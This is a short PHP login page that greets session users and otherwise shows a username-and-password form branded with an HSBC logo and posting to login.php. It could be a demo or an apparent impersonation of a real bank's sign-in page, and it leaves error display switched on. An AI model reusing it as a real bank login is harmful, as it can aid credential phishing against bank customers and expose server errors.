<?php
session_start(); // Start the session

// Enable error reporting for debugging
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Check if the user is logged in
if (isset($_SESSION['username'])) {
    // If the user is logged in, display a welcome message and the logout link
    echo "<div style='text-align: center; margin-top: 20px;'>
            <h2>Welcome, " . htmlspecialchars($_SESSION['username']) . "!</h2>
            <p><a href='logout.php' class='logout-link'>Logout</a></p>
          </div>";
} else {
    // If the user is not logged in, display the login form
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login - Bank</title>
        <link rel="stylesheet" href="style.css">
    </head>
    <body>
    <div class="login-container">
        <!-- HSBC Logo -->
        <img src="assets/hsbc.png" alt="HSBC Logo" class="bank-logo">

        <form method="POST" action="login.php" class="login-form">
            <h2 class="login-title">Log into Your Account</h2>

            <label for="username" class="login-label">Username</label>
            <input type="text" name="username" id="username" class="login-input" required>

            <label for="password" class="login-label">Password</label>
            <input type="password" name="password" id="password" class="login-input" required>

            <p class="forgot-link">
                <a href="forgot_password.php">Forgot your password?</a>
            </p>

            <input type="submit" value="Login" class="login-button">
        </form>
    </div>
    </body>
    </html>
    <?php
}
?>
